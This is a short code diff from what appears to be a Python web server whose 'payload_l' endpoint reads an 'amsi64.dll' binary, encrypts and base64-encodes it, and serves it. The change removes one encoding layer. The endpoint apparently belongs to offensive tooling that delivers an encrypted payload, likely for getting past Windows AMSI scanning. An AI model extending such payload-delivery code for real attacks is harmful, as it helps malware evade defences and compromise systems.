@@ -315,7 +315,7 @@ def payload_l():
         filename = os.path.join(BASE_DIR, 'binary', 'amsi64.dll')
     with open(filename, 'rb') as f:
         DLL = f.read()
-    DLL = b64encode(encrypt(b64encode(DLL), KEY))
+    DLL = b64encode(encrypt(DLL, KEY))
     return Response(DLL, content_type='text/plain; charset=utf-8')
 
 
